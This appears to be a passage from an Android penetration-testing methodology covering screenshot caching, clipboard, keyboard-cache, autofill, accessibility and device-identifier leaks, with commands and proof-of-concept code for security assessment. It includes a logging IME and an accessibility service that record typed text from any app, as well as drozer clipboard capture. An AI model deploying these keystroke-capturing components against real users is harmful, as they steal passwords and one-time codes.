| **VRT** | `insecure_data_storage.screen_caching_enabled` (**P5**) |
| **Attacker** | AM-11 / AM-05 |
| **Applies to** | all; **D04-042, D04-043 and D04-044 own the mechanics** — this item exists so the D20 pass does not re-derive them and so the privacy framing is recorded |
| **Maps to** | MASTG-TEST-0289 (Runtime Verification of Sensitive Content Exposure in Screenshots During App Backgrounding — names the exact paths `/data/system_ce/0/snapshots` and `/data/system`), MASTG-TEST-0291 (References to Screen Capturing Prevention APIs), MASTG-TEST-0292 (`setRecentsScreenshotEnabled` not used), MASTG-TEST-0293 (`SurfaceView.setSecure` not used), MASTG-TEST-0294 (Compose dialogs `SecureOn` not used) — **0292/0293/0294 are `status: placeholder` with no published procedure, so test them by hand**; MASTG-KNOW-0053; MASTG-BEST-0014; MASWE-0038; semgrep rule `mastg-android-sensitive-data-in-screenshot`; deprecated predecessor MASTG-TEST-0010; AOSP threat [T.P4] "Screen unlocked (shared) devices under control of an authorized but different user" |

- **Test:** Run D04-042/043/044 once, then bring the result here and answer the only question that changes
  the rating: **what data class is on that frame, and who picks up the device?** A balance on a personal
  phone is P5. A patient record on a ward tablet, a PAN on a POS terminal, or a recovery phrase on any device
  is a data-class argument that lifts the write-up out of `screen_caching_enabled`. Also check the three
  gaps that sit *under* a correctly set `FLAG_SECURE`: a `clearFlags()` during a transition, a `SurfaceView`
  (video, camera preview, map, PDF renderer) with its own secure flag, and a Compose `Dialog` whose window is
  separate from the activity's.
- **How:**
```bash
grep -rnE 'FLAG_SECURE|clearFlags\([^)]*FLAG_SECURE|setRecentsScreenshotEnabled|SurfaceView|setSecure\(|DialogProperties|SecureFlagPolicy|excludeFromRecents' out/sources/ out/AndroidManifest.xml
semgrep -c rules/mastg-android-sensitive-data-in-screenshot.yml out/sources/
adb shell input keyevent KEYCODE_APP_SWITCH && adb exec-out screencap -p > recents.png
adb root && adb shell ls -la /data/system_ce/0/snapshots/ && adb pull /data/system_ce/0/snapshots ./snaps/
```
- **Proof:** The pulled snapshot or Recents capture showing the value, **named by data class** —
  "a full 16-digit PAN", not "sensitive data" — plus the shared-device or borrowed-device scenario the
  client actually supports.
- **Escalation:** -> D04 for the mechanics and the differential evidence; -> D20-017/D20-018 for the
  in-process capture that `FLAG_SECURE` does not stop; -> D11 because the snapshot is also a file on disk.
- **Ruled out when:** Every screen carrying a credential, PAN, OTP, seed phrase or health datum produces a
  black `screencap`, `screenrecord` refuses, and no snapshot file exists for the package after backgrounding
  from those screens. Attach the black frame — it is one of the few visually provable negatives here.

### D20-041 · Framework single-surface rendering — one missing flag exposes the whole screen

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5); escalate on data class |
| **Attacker** | AM-04 / AM-11 |
| **Applies to** | Flutter, Unity, and any engine rendering into a single `SurfaceView`/`TextureView`; also Cordova/Capacitor/RN where the WebView is the whole window |
| **Maps to** | MASTG-TEST-0293 (`setSecure` not used to prevent screenshots in `SurfaceView`s); MASWE-0038 |

- **Test:** Native Android lets you protect a single activity. Flutter and Unity render every screen into one
  surface on one host activity, so the protection decision is **all or nothing**: either the host activity
  sets `FLAG_SECURE` (and the whole app becomes unscreenshotable, which product usually rejects) or nothing is
  protected, including the PIN pad and the card form. Many teams resolve this with a plugin that toggles the
  flag per route — test the toggle's timing, because a route transition is exactly where it fails.
- **How:**
```bash
grep -rn 'FLAG_SECURE\|setSecure\|SecureFlagPlugin\|no_screenshot\|flutter_windowmanager\|ScreenProtector' out/sources/ out_dir/pp.txt hbc.strings 2>/dev/null | head
# capture at the transition, not at rest
adb shell am start -n $PKG/.MainActivity
# navigate to the PIN route, then immediately:
adb exec-out screencap -p > t_pin.png
adb shell input keyevent KEYCODE_APP_SWITCH && adb exec-out screencap -p > t_recents.png
```
- **Proof:** A non-black capture of the PIN / card / seed screen in a release build, and — where a per-route
  toggle exists — a non-black capture taken during the route transition into it.
- **Escalation:** -> D04-044 (`clearFlags` and the transition gap, same mechanism); -> the framework chapter
  for how the route toggle is implemented.
- **Ruled out when:** The host activity sets `FLAG_SECURE` for the whole app, or the per-route toggle is
  applied in the route's build phase (not after first frame) and captures at the transition are black.

### D20-042 · `uiautomator dump` — the on-screen text an accessibility-capable consumer reads

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-04 (an enabled accessibility service; `uiautomator` itself is AM-11/AM-12 and is only the evidence tool) |
| **Applies to** | all |
| **Maps to** | MASWE-0040; MASWE-0036; MASTG-TEST-0316 |

- **Test:** The underrated check. A screenshot proves a human can read the screen; a `uiautomator` dump proves
  a **program** can read it, as structured text, without any image processing. Anything present as `text=` or
  `content-desc=` in the dump is what an accessibility service or autofill consumer sees.
- **How:**
```bash
adb shell uiautomator dump /sdcard/ui.xml && adb pull /sdcard/ui.xml
grep -oE '(text|content-desc)="[^"]*"' ui.xml | grep -inE '[0-9]{6}|[0-9]{12,19}|@|zq4h7m2kx9|balance|iban'
echo "nodes: $(grep -c '<node' ui.xml)"
```
- **Proof:** The card number, OTP, balance or personal datum present as readable `text=` in the node dump of a
  sensitive screen, with the node count proving the dump succeeded.
- **Escalation:** -> D20-050 (the accessibility finding proper); -> D20-048 (the same tree reaches an autofill
  service via `AssistStructure`).
- **Ruled out when:** The dump of every sensitive screen shows the secret rendered by a custom view with no
  node text, or the node's text masked, with a non-zero node count proving the dump worked. Note that custom
  input controls (game engines, custom UI frameworks) produce **expected false negatives** for the masking
  tests — say so rather than claiming a clean result.

### D20-043 · Sensitive value copied to the clipboard without `EXTRA_IS_SENSITIVE`

| | |
|---|---|
| **Severity ceiling** | Low standalone (High when the copied value is an OTP or a recovery phrase) |
| **VRT** | `mobile_security_misconfiguration.clipboard_enabled` (**P5**). The VRT changelog shows the finer-grained children `on_sensitive_content` / `on_non_sensitive_content` were **removed** and the parent set to P5 "due to children removal" — Bugcrowd deliberately flattened this and will not entertain a "but it was sensitive content" argument *on category grounds*. Escalate through the value: `broken_authentication_and_session_management.two_fa_bypass` (P3) for an OTP, `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) otherwise |
| **Attacker** | AM-04 (the default IME's clipboard history; a foreground app) |
| **Applies to** | `ClipDescription.EXTRA_IS_SENSITIVE` exists from **Android 13 (API 33)**; below 33 the literal string `"android.content.extra.IS_SENSITIVE"` is used |
| **Maps to** | MASWE-0030 (Improper Use of the Clipboard, CWE-200/CWE-668 — modes: copying secrets without consent, not flagging with `EXTRA_IS_SENSITIVE`, not clearing, processing pasted data without validation). **There is no Android MASTG-TEST for the clipboard — a documented MASTG gap.** developer.android.com `privacy-and-security/risks/secure-clipboard-handling` and `develop/ui/views/touch-and-input/copy-paste`; T1414 Clipboard Data |

- **Test:** "Copy" buttons on account numbers, IBANs, card numbers, recovery phrases, OTPs and API tokens.
  Without the sensitive flag the value is rendered in the Android 13+ copy-confirmation preview and retained
  in every keyboard's clipboard history — which outlives the app.
- **How:**
```bash
grep -rnE 'setPrimaryClip|ClipData\.newPlainText|ClipDescription|EXTRA_IS_SENSITIVE|android\.content\.extra\.IS_SENSITIVE|clearPrimaryClip|getPrimaryClip' out/sources/ -A4
```
  The correct form (API 33+) is
  `description.extras = PersistableBundle().apply { putBoolean(ClipDescription.EXTRA_IS_SENSITIVE, true) }`,
  and below 33 the literal `"android.content.extra.IS_SENSITIVE"` key.
```javascript
Java.perform(function () {
  var CM = Java.use('android.content.ClipboardManager');
  CM.setPrimaryClip.implementation = function (c) {
    var d = c.getDescription();
    var ex = d.getExtras();
    console.log('[setPrimaryClip] ' + c.getItemAt(0).getText() +
      ' | sensitive=' + (ex ? ex.getBoolean('android.content.extra.IS_SENSITIVE') : 'no-extras'));
    return this.setPrimaryClip(c);
  };
});
```
- **Proof:** The hook line showing an OTP / seed phrase / PAN placed on the clipboard with
  `sensitive=false`, **plus** the value visible in any keyboard's clipboard history (or the Android 13+ copy
  confirmation) after the app is closed, **plus** the value still present minutes later because nothing
  cleared it.
- **Escalation:** -> D13 for a copied OTP; -> D20-046 for the IME half. Also state the honest platform
  position: from Android 10 (API 29) background apps cannot read the clipboard and from Android 12 (API 31)
  the system shows a toast on clipboard access, so the realistic surface is the preview, the history and the
  keyboard — not silent background theft.
- **Ruled out when:** Every "Copy" action sets `EXTRA_IS_SENSITIVE` (shown by the hook), the clip is cleared
  on a timer or on app background (`clearPrimaryClip`), and the value does not appear in keyboard clipboard
  history. Screenshot the empty history entry.

### D20-044 · Prove the cross-app clipboard read from a different UID — and state the mitigations honestly

| | |
|---|---|
| **Severity ceiling** | Low (High only via the value) |
| **VRT** | `mobile_security_misconfiguration.clipboard_enabled` (**P5**); `external_behavior.system_clipboard_leak.shared_links` (P5) |
| **Attacker** | AM-04 — a **foreground** app, or the default IME. **Background clipboard scraping is dead from Android 10; do not claim it.** |
| **Applies to** | **CURRENT** Android 10+ behaviour; LEGACY below that |
| **Maps to** | objection `android clipboard monitor`; drozer-modules `metall0id/post/clipboard.py` (`post.capture.clipboard`, `post.perform.setclipboard`) — MASTG-TOOL-0015, MASTG-TOOL-0029; T1414 Clipboard Data (ATT&CK: from Android 10, `ClipboardManager.OnPrimaryClipChangedListener()` *"can only be used if the application is in the foreground, or is set as the device's default input method editor (IME)"*) |

- **Test:** The claim that carries weight is "a *different* application read this value", demonstrated from a
  different UID. Everything else is a description of the clipboard.
- **How:**
```
# objection, in-process (shows what the target writes)
android clipboard monitor

# drozer, from a DIFFERENT UID — which is the point
dz> module install metall0id.post.clipboard
dz> run post.capture.clipboard
[*] Clipboard value: test123
dz> run post.perform.setclipboard test123
dz> permissions
```
```bash
adb shell "service call clipboard 1 s16 $PKG" 2>/dev/null
adb shell dumpsys clipboard 2>/dev/null | head
```
- **Proof:** `run post.capture.clipboard` printing the target's secret from the drozer agent's own process,
  screenshotted next to the app's "Copied!" toast — and the agent's `permissions` output, so the reader can
  judge the precondition. Note in the report that the agent was in the foreground (Android 10+ requirement).
- **Escalation:** -> D13 for a captured OTP or recovery phrase.
- **Ruled out when:** A foreground read from a second UID returns empty because the app cleared the clip, or
  because the value was never placed there. Record the empty read alongside the "Copied!" toast.

### D20-045 · Clipboard READ by the app, and the paste-validation direction

| | |
|---|---|
| **Severity ceiling** | High (for an app that reads and exfiltrates the clipboard); Medium for the paste direction |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) for the read; the paste direction is a business-logic finding rated on the transaction |
| **Attacker** | For the read: the app itself as AM-08-shaped behaviour. For the paste: AM-04 (a clipboard-swapping app) |
| **Applies to** | all; the read direction is constrained to foreground/default-IME from **Android 10** |
| **Maps to** | MASWE-0030; T1414 Clipboard Data; T1641.001 Transmitted Data Manipulation (ATT&CK: *"replacing a copied Bitcoin wallet address with a wallet address that is under adversarial control"*; S.O.V.A. S1062 *"specifically manipulates clipboard data to swap cryptocurrency addresses"*) |

- **Test:** Two directions nobody runs together. (a) Does the app read the clipboard on resume and ship what
  it finds — often whatever the user last copied out of a password manager? (b) For a payments or crypto app,
  is an address **pasted into** the app re-validated and shown back in full before the transaction commits?
  Clipboard swapping is only exploitable when the app trusts the pasted value without a confirmation step
  displaying the full string.
- **How:**
```bash
grep -rnE 'getPrimaryClip|OnPrimaryClipChangedListener|addPrimaryClipChangedListener|hasPrimaryClip' out/sources/ -A6
```
```javascript
Java.perform(function () {
  var CM = Java.use('android.content.ClipboardManager');
  CM.getPrimaryClip.implementation = function () {
    var c = this.getPrimaryClip();
    console.log('[getPrimaryClip] ' + (c ? c.getItemAt(0).getText() : 'null') + '\n' +
      Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
    return c; };
});
```
```bash
# (a) canary test
adb shell am broadcast -a clipper.set --es v zk8v3p1nd6   # or copy the canary manually
# bring the app to the foreground, then look for zk8v3p1nd6 in the proxy capture
mitmdump -nr run.mitm --set flow_detail=3 2>/dev/null | grep -c zk8v3p1nd6
# (b) paste-swap test: put a DIFFERENT address on the clipboard than the one the UI shows
```
- **Proof:** (a) The canary string appearing in an outbound request the app had no reason to make, with the
  `getPrimaryClip` backtrace naming the caller. (b) A transaction confirmation screen that truncates or
  omits the pasted address, so a swapped value commits without the user being able to see it.
- **Escalation:** (a) -> D18 if the caller is an SDK; (b) -> D23 for the financial impact.
- **Ruled out when:** (a) `getPrimaryClip` is called only from a paste-handling code path the user initiated,
  and the canary never leaves the device. (b) The confirmation screen displays the destination address in
  full, in a non-truncated, non-eliding view, and requires an explicit confirmation.

### D20-046 · Keyboard cache on sensitive fields, and `IME_FLAG_NO_PERSONALIZED_LEARNING`

| | |
|---|---|
| **Severity ceiling** | Low (Medium for a full PAN, password or recovery phrase) |
| **VRT** | `external_behavior.browser_feature.autocorrect_enabled` (P5), `…autocomplete_enabled` (P5); escalate on the value |
| **Attacker** | AM-04 (the IME), AM-05 (a shared device where the suggestion surfaces for the next user) |
| **Applies to** | all; Jetpack Compose equivalent is `KeyboardOptions(keyboardType = …, autoCorrect = false)` |
| **Maps to** | MASTG-TEST-0258 (References to Keyboard Caching Attributes in UI Elements), MASTG-KNOW-0055 (Keyboard Cache — "Non-Caching Input Types"), MASTG-BEST-0019, MASWE-0036, semgrep rule `mastg-android-keyboard-cache-input-types`; deprecated predecessor MASTG-TEST-0006; AOSP `EditorInfo` javadoc for `IME_FLAG_NO_PERSONALIZED_LEARNING` (value `0x1000000`), verbatim: *"used to request that the IME should not update any personalized data such as typing history and personalized language model based on what the user typed on this text editing object"*; T1533 Data from Local System (ATT&CK names "keyboard cache" as an example of local system data) |

- **Test:** A field that is not a non-caching input type has its contents learned by the IME dictionary and
  re-offered as a suggestion — including on another app's screen and, for cloud-syncing keyboards, on another
  device. **Be precise about the claim:** a password `inputType` stops *personalisation and suggestion*
  leakage; it does not stop a malicious IME from reading the text (that is D20-047).
- **How:**
```bash
grep -rn 'android:inputType' out/res/layout/*.xml \
  | grep -viE 'textPassword|textVisiblePassword|textWebPassword|numberPassword|textNoSuggestions' \
  | grep -iE 'pin|card|cvv|otp|ssn|password|account|iban|seed|mnemonic|passport'
grep -rnE 'setInputType|KeyboardOptions|keyboardType|autoCorrect|imeOptions|IME_FLAG_NO_PERSONALIZED_LEARNING|flagNoPersonalizedLearning' out/sources/ out/res/layout/
```
- **Proof:** Type a unique marker into the field, then open a text field in a **different** app and observe
  the IME suggesting it. Screen-record the suggestion strip.
- **Escalation:** -> D13 for a cached OTP or PAN recovered on a shared device; -> D20-047 for the malicious-IME
  model. The same missing flag also means the value lands in the keyboard's cloud sync — a second, durable
  disclosure; check the suggestion strip on a second device signed into the same keyboard account.
- **Ruled out when:** Every field carrying a secret uses a non-caching `inputType` (or Compose
  `autoCorrect = false` with a password keyboard type) **and** sets `IME_FLAG_NO_PERSONALIZED_LEARNING`, and
  the marker does not surface in another app's suggestion strip after entry. Record the empty strip.

### D20-047 · The third-party IME as a single-grant attacker against unmarked fields

| | |
|---|---|
| **Severity ceiling** | Medium (High for card data, OTPs, recovery seeds and passwords) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); with an OTP, `broken_authentication_and_session_management.two_fa_bypass` (P3) |
| **Attacker** | **AM-04** — being the default IME is one user action (or a keyboard a family member installed, which is AM-05 flavoured) |
| **Applies to** | all |
| **Maps to** | HackTricks `inputmethodservice-ime-abuse.md` (note: `BIND_INPUT_METHOD` on the service only restricts *binding* to the system; the operative step is the victim enabling and selecting the keyboard); AOSP threat [T.A5] — the IME is one of only two parties allowed to read the clipboard from Android 10 and is an explicit trust point in the platform model; MASWE-0036 |

- **Test:** An IME sees every keystroke in every app, including apps with no WebView at all. The app's only
  defences are marking sensitive fields as a password `inputType` and setting
  `IME_FLAG_NO_PERSONALIZED_LEARNING`, and the app-side finding is that it treated typed secret entry as a
  trust boundary. Note the common real-world gap: many apps use a **plain numeric field** for OTP and CVV so
  the digits stay visible, which removes even the personalisation protection.
- **How:**
```bash
# what do the sensitive inputs declare?
grep -rnE 'inputType|imeOptions|EditText|TextInputEditText|OutlinedTextField|KeyboardOptions' \
     out/res/layout/*.xml out/sources/ | grep -iE 'card|cvv|pin|otp|password|ssn|account|iban|seed|mnemonic'
# runtime confirmation with a logging IME (AOSP sample soft keyboard is the easiest base)
adb shell ime list -a
adb shell ime enable com.attacker/.LoggingIme && adb shell ime set com.attacker/.LoggingIme
adb logcat -s LOGIME
adb shell dumpsys input_method | head -40
```
  In the PoC IME, log `onStartInput`'s `EditorInfo.packageName`, `inputType` and `imeOptions` alongside the
  committed text, so the evidence names the target field.
- **Proof:** `LOGIME` lines containing the card / OTP / seed characters as typed, with the target's package
  name from `EditorInfo`, next to the layout XML showing that field has no password `inputType` and no
  `flagNoPersonalizedLearning`.
- **Escalation:** -> D13 for the OTP; the remediation to recommend is a custom in-app keypad for the most
  sensitive entry (MASWE-0040's mitigation) plus passkeys instead of typed secrets, and MDM IME allow-listing
  for managed fleets.
- **Ruled out when:** Every secret-bearing field uses a password `inputType` and `IME_FLAG_NO_PERSONALIZED_LEARNING`,
  or the app renders its own keypad for PIN/OTP/CVV entry so no IME is invoked at all — verified by the PoC
  IME never receiving `onStartInput` for those fields.

### D20-048 · Autofill `AssistStructure` exposure — `importantForAutofill` and `setDataIsSensitive`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-04 — the user enabling a third-party autofill service is a single action |
| **Applies to** | **API 26+** |
| **Maps to** | developer.android.com `identity/autofill/autofill-services` (`AssistStructure` traversal via `WindowNode` / `ViewNode` with `getText()` and `getHint()`, `IMPORTANT_FOR_AUTOFILL_YES/NO/AUTO`, `setDataIsSensitive()`, `BIND_AUTOFILL_SERVICE`, action `android.service.autofill.AutofillService`); `guide/topics/text/autofill-services` (SaveInfo, Dataset, `setAuthentication`, the WebView caution *"compromised web content could capture autofilled data"*, and "verify package identity before sending data to untrusted packages"); MASWE-0036, MASWE-0040, MASWE-0019 (Lack of Auto-fill Support for Credential Providers) |

- **Test:** An enabled `AutofillService` receives an `AssistStructure` — the **full view hierarchy of the
  foreground app**, including `getText()` on views the app never intended to expose: a displayed balance, a
  one-time code, a decrypted note. `android:importantForAutofill` values are `auto`, `yes`, `no`,
  `yesExcludeDescendants`, `noExcludeDescendants`; a sensitive field left at the default `auto` participates.
  The mirror-image finding is a CVC or OTP field that is autofillable **into a WebView**, which the
  documentation explicitly warns against.
- **How:**
```bash
grep -rnE 'importantForAutofill|setImportantForAutofill|IMPORTANT_FOR_AUTOFILL_NO|setDataIsSensitive|autofillHints|setAutofillHints|AUTOFILL_HINT_' out/sources/ out/res/layout/
grep -rn 'BIND_AUTOFILL_SERVICE\|android.service.autofill.AutofillService' out/AndroidManifest.xml
# empirical proxy for what a consumer sees:
adb shell uiautomator dump /sdcard/ui.xml && adb pull /sdcard/ui.xml && grep -c '<node' ui.xml
```
- **Proof:** The sensitive value present in the dumped hierarchy of a screen that displays it, with no
  `importantForAutofill="no"` on that node; or, for the WebView variant, the autofill picker filling a CVC
  into a WebView-hosted form (capture the fill).
- **Escalation:** -> D20-050 (the same tree is what accessibility reads); -> D10 for the WebView fill.
  If the target app *is* an autofill service, the severity inverts and becomes Critical — a dataset returned
  to a stub app that merely declares a matching field, with no signature check on the requesting package.
- **Ruled out when:** Every view rendering a secret sets `importantForAutofill="no"` (or
  `noExcludeDescendants` on its container) and `setDataIsSensitive(true)` is applied to filled datasets, with
  the node dump showing the value absent or masked.

### D20-049 · Credential and OTP fields rendered in plain text

| | |
|---|---|
| **Severity ceiling** | Low (Medium in combination with the capture items) |
| **VRT** | `external_behavior.browser_feature.plaintext_password_field` (**P5**) |
| **Attacker** | AM-11 (shoulder surfing), and it multiplies every capture item above |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0316 (App Exposing User Authentication Data in Text Input Fields), MASWE-0036, semgrep rule `mastg-android-input-field-usage`; deprecated predecessor MASTG-TEST-0008 |

- **Test:** Access codes and verification codes must be masked: in XML `android:inputType="textPassword"`;
  in Compose `SecureTextField` (default `TextObfuscationMode.RevealLastTyped`). MASTG's caveats matter —
  a `SecureTextField` set to `RevealLastTyped`/`Hidden` can be switched to `Visible` programmatically, and
  custom input controls (game engines, custom UI frameworks) produce **expected false negatives**.
- **How:**
```bash
semgrep -c rules/mastg-android-input-field-usage.yml out/sources/
grep -rnE 'TextField|SecureTextField|TextObfuscationMode|PasswordVisualTransformation|setTransformationMethod|PasswordTransformationMethod' out/sources/
grep -rn 'android:inputType' out/res/layout/*.xml
```
- **Proof:** A password/OTP field rendering characters, or `SecureTextField(textObfuscationMode =
  TextObfuscationMode.Visible)`. Screenshot the unmasked field.
- **Escalation:** Multiplies D20-040 (Recents), D20-042 (node dump), D20-018 (session replay) and D20-046
  (keyboard cache) — an unmasked field is captured by all four.
- **Ruled out when:** Every authentication field masks by default and the reveal toggle is an explicit user
  action, verified on screen; or the app uses a custom keypad with no text field at all (state this as the
  expected false negative rather than a clean pass).

### D20-050 · Accessibility node text exposing secrets, and `accessibilityDataSensitive`

| | |
|---|---|
| **Severity ceiling** | High (for a full PAN or an OTP in a financial app); Medium generally |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); with an OTP, `broken_authentication_and_session_management.two_fa_bypass` (P3) |
| **Attacker** | **AM-04** — an enabled accessibility service, which is precisely what the prevailing Android banking-malware family obtains |
| **Applies to** | all; `android:accessibilityDataSensitive="accessibilityDataPrivateYes"` is the **API 34+** control, `setAccessibilityDataSensitive()` its runtime form, `importantForAccessibility="no"` the pre-34 fallback |
| **Maps to** | MASWE-0040 (Sensitive Data Leaked via Accessibility Services, CWE-200/CWE-359 — modes: secrets in accessibility metadata, sensitive fields not using secure input, high-risk flows fully automatable, system keyboards exposing sensitive input). **There is no Android MASTG-TEST for accessibility — a documented MASTG gap.** developer.android.com `guide/topics/ui/accessibility/service` (`canRetrieveWindowContent`, `canPerformGestures`, `accessibilityEventTypes="typeAllMask"`, node `text`/`contentDescription`, `performAction`, `dispatchGesture`); HackTricks `accessibility-services-abuse.md`; T1453; T1517 |

- **Test:** A service declaring `android:canRetrieveWindowContent="true"` reads
  `AccessibilityNodeInfo.text` across the whole system; with `canPerformGestures="true"` it also drives the
  UI. The **app-side** finding is a sensitive screen whose nodes carry the secret in `text` or
  `contentDescription` with no sensitivity marking — and a `TYPE_VIEW_TEXT_CHANGED` stream that hands over
  the password or OTP character by character as it is typed.
- **How:**
```bash
adb shell settings get secure enabled_accessibility_services
adb shell dumpsys accessibility | grep -i 'Accessibility Service'
grep -rnE 'importantForAccessibility|setImportantForAccessibility|contentDescription|setContentDescription|accessibilityDataSensitive|setAccessibilityDataSensitive|ACCESSIBILITY_DATA_SENSITIVE' out/sources/ out/res/layout/
adb shell uiautomator dump /sdcard/a.xml && adb pull /sdcard/a.xml && grep -oE 'text="[^"]*"' a.xml | head -40
```
  Then build the PoC service and log the events:
```xml
<service android:name=".A11y" android:exported="true"
         android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
  <intent-filter><action android:name="android.accessibilityservice.AccessibilityService"/></intent-filter>
  <meta-data android:name="android.accessibilityservice" android:resource="@xml/a11y_config"/>
</service>
```
```xml
<!-- res/xml/a11y_config.xml -->
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
  android:accessibilityEventTypes="typeAllMask"
  android:canRetrieveWindowContent="true"
  android:accessibilityFeedbackType="feedbackGeneric"
  android:notificationTimeout="0"/>
```
```java
@Override public void onAccessibilityEvent(AccessibilityEvent e) {
  Log.e("POC", e.getPackageName() + " type=" + e.getEventType() + " text=" + e.getText());
}
```
- **Proof:** Your PoC service receiving the typed password or OTP from `TYPE_VIEW_TEXT_CHANGED`, or a
  `uiautomator` dump showing the secret in a node's `text` / `content-desc`, with the target's package name
  in the same line and the enabling toggle screenshotted.
- **Escalation:** -> D13 (harvested credentials); -> D23 (with `canPerformGestures` the service also drives
  the payment flow — see the J21 join); the control whose absence you report is MASWE-0040's mitigation, a
  custom in-app keypad for sensitive entry plus biometric-bound friction on high-risk flows.
- **Ruled out when:** Every secret-bearing view sets `accessibilityDataSensitive="accessibilityDataPrivateYes"`
  (API 34+) or `importantForAccessibility="no"`, the sensitive fields use secure input so their text is
  masked to accessibility, and the PoC service receives no secret across the login and payment flows. State
  the API-34 availability boundary — the control does not exist on older devices, so give the supported range.

### D20-051 · App-side defences against an untrusted accessibility service or an active overlay

| | |
|---|---|
| **Severity ceiling** | Medium (a missing control) |
| **VRT** | no VRT node for the missing control; file the demonstrated capture under `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) and name the missing control as remediation |
| **Attacker** | AM-04 |
| **Applies to** | banking, wallet, health and any app whose threat model includes on-device malware |
| **Maps to** | HackTricks `accessibility-services-abuse.md` "Hardening recommendations for app developers" — `android:accessibilityDataSensitive="accessibilityDataPrivateYes"` (API 34+), `setFilterTouchesWhenObscured(true)` + `FLAG_SECURE`, overlay detection, refusing to operate when `Settings.canDrawOverlays()` or a non-trusted service is active; MDM/EMM can enforce `ACCESSIBILITY_ENFORCEMENT_DEFAULT_DENY` (**Android 13+**) to block sideloaded services; MASTG-TEST-0340 (References to Overlay Attack Protections); MASWE-0025 |

- **Test:** The platform-level abuse of accessibility is a device-compromise scenario, not an app bug. The
  *app-side* finding is that a high-value app performs an irreversible action while an untrusted service or
  an overlay is active, with no detection and no degradation. This is a hardening finding — write it as one,
  with the capture from D20-050 as the demonstrated impact.
- **How:**
```bash
grep -rnE 'canDrawOverlays|AccessibilityManager|getEnabledAccessibilityServiceList|setFilterTouchesWhenObscured|filterTouchesWhenObscured|FLAG_WINDOW_IS_OBSCURED|FLAG_WINDOW_IS_PARTIALLY_OBSCURED|isAccessibilityToolPresent' out/sources/ out/res/layout/
adb shell settings put secure enabled_accessibility_services com.poc/.A11y
adb shell settings put secure accessibility_enabled 1
# then drive a transfer/approval and see whether the app reacts at all
```
- **Proof:** The transfer or approval completing with the PoC accessibility service enabled and an overlay
  drawn, with no warning, no degradation and no additional authentication.
- **Escalation:** -> D04 tapjacking; -> D13 if the confirmation was supposed to be biometric-bound.
- **Ruled out when:** The app enumerates enabled services against an allow-list (or `isAccessibilityTool`),
  applies `setFilterTouchesWhenObscured(true)` on every confirmation control, and blocks or step-ups the
  action while an untrusted service or overlay is present — demonstrated by the action being refused.

### D20-052 · Non-resettable hardware identifiers — IMEI, MEID, ESN, IMSI, build/SIM/USB serials

| | |
|---|---|
| **Severity ceiling** | Medium (High on an OEM engagement, where a platform restriction is bypassed) |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null); if it becomes an auth factor, see D20-057 |
| **Attacker** | AM-08 (the recipient); AM-03 on an OEM build where a non-privileged app obtains a restricted value |
| **Applies to** | **Android 10+**: the restriction applies to **all devices regardless of target API level**. Apps targeting 10+ get a `SecurityException`; apps targeting 9 or earlier holding `READ_PHONE_STATE` get "`null` or placeholder data". **LEGACY:** below 10, `READ_PHONE_STATE` alone returned the real IMEI |
| **Maps to** | source.android.com `docs/core/permissions/immutable-device-ids` — restricted IDs are "telephony IMEI, MEID, ESN, and IMSI numbers, build, SIM, or USB serial numbers"; access limited to the default SMS app, privileged apps holding `READ_PRIVILEGED_PHONE_STATE` **and** allow-listed in `privapp-permission.xml`, carrier-privileged apps, and device/profile owners with `READ_PHONE_STATE`; AOSP security-model threat [T.D1] "Abusing unique identifiers for targeted attacks … including using stable device identifiers to cross profile boundaries or factory resets"; MASWE-0068 (CWE-359); MobSF rules `api_get_device`, `api_get_subscriber`, `api_get_sim_serial`, `api_get_sim_provider`, `api_get_sim_operator`, `api_get_phone`; QARK `file/phone_identifier.py`; T1422 lineage via T1636 |

- **Test:** Their presence in modern code means one of three things and you must say which: a legacy path
  that now returns null, a privileged/carrier/DPC build that genuinely obtains them, or an OEM leak. Tying
  any of them to a user account defeats the platform's identifier-resettability property, which is the point
  of the restriction.
- **How:**
```bash
grep -rnE 'getDeviceId\(|getImei\(|getMeid\(|getSubscriberId\(|getSimSerialNumber\(|getSimOperator\(|getLine1Number\(|Build\.getSerial\(|Build\.SERIAL' out/sources/ -B4 -A4
grep -nE 'READ_PRIVILEGED_PHONE_STATE|READ_PHONE_STATE|READ_PHONE_NUMBERS' out/AndroidManifest.xml
adb shell dumpsys package $PKG | grep -i READ_PRIVILEGED_PHONE_STATE
adb shell service call iphonesubinfo 1 2>/dev/null | head
# and where does it go?
IMEI=$(adb shell service call iphonesubinfo 1 2>/dev/null | tr -d '\r')
mitmdump -nr run.mitm --set flow_detail=3 2>/dev/null | grep -cE '[0-9]{15}'
```
- **Proof:** A proxy capture containing a real IMEI / serial alongside an account identifier; or, on an OEM
  build, a non-privileged app obtaining the value where Android 10+ should have thrown `SecurityException`.
- **Escalation:** Cross-reset and cross-profile tracking — a stable supercookie for account linkage
  ([T.D1]). -> D25 for the OEM direction; -> D20-025 for the declaration mismatch.
- **Ruled out when:** The getters exist only in a dead legacy branch guarded by a `Build.VERSION` check, the
  app holds neither `READ_PRIVILEGED_PHONE_STATE` nor carrier privilege, and the runtime call returns null or
  throws — shown from a Frida hook on the getter, not just from the grep.

### D20-053 · `ANDROID_ID` / SSAID and advertising-ID linkage to a persistent identity

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null); a resettable advertising ID on its own is not a finding |
| **Attacker** | AM-08 |
| **Applies to** | all; `ANDROID_ID` before **Android 8.0 (API 26)** was a non-resettable, first-boot random value, while in recent versions it is unique per app-signing-key + user + device |
